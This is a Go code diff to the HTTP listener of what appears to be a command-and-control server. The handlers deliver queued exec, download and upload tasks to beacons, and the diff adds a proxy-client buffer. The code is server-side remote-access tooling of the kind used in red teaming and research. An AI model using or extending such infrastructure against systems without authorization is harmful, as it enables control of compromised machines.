@@ -29,25 +29,21 @@ type IHttpListener interface {
 }
 
 type HttpListener struct {
-	iface string
-	hostname string
-	port int
+	Iface string `json:"Interface"`
+	Hostname string `json:"Hostname"`
+	Port int `json:"Port"`
 }
 
 func (server HttpListener) startListener() (error) {
 	var router = mux.NewRouter()
-	var ifaceIp = getIfaceIp(server.iface)
-	router.HandleFunc("/{data}", server.beaconPostHandler).Host(server.hostname).Methods("Post")
-	router.HandleFunc("/{data}", server.beaconGetHandler).Host(server.hostname).Methods("Get")
-	router.HandleFunc("/d/{data}", server.beaconUploadHandler).Host(server.hostname).Methods("Get")
-
-	staticFileDirectory := http.Dir("./www/")
-	staticFileHandler := http.StripPrefix("/c2/", http.FileServer(staticFileDirectory))
-	router.PathPrefix("/c2/").Handler(staticFileHandler).Methods("GET")
+	var ifaceIp = getIfaceIp(server.Iface)
+	router.HandleFunc("/{data}", server.beaconPostHandler).Host(server.Hostname).Methods("Post")
+	router.HandleFunc("/{data}", server.beaconGetHandler).Host(server.Hostname).Methods("Get")
+	router.HandleFunc("/d/{data}", server.beaconUploadHandler).Host(server.Hostname).Methods("Get")
 
 	srv := &http.Server{
         Handler:      router,
-        Addr:         ifaceIp + ":" + strconv.Itoa(server.port),
+        Addr:         ifaceIp + ":" + strconv.Itoa(server.Port),
         WriteTimeout: 15 * time.Second,
         ReadTimeout:  15 * time.Second,
     }
@@ -134,11 +130,13 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 	respMap["exec"] = beacon.ExecBuffer
 	respMap["download"] = beacon.DownloadBuffer
 	respMap["upload"] = beacon.UploadBuffer
+	respMap["proxyclients"] = beacon.ProxyClientBuffer
 
 	json.NewEncoder(w).Encode(respMap)
 	beacon.ExecBuffer = nil
 	beacon.DownloadBuffer = nil
 	beacon.UploadBuffer = nil
+	beacon.ProxyClientBuffer = nil
 
 	if len(update.Data) > 0 {
 		if update.Type == "exec" {
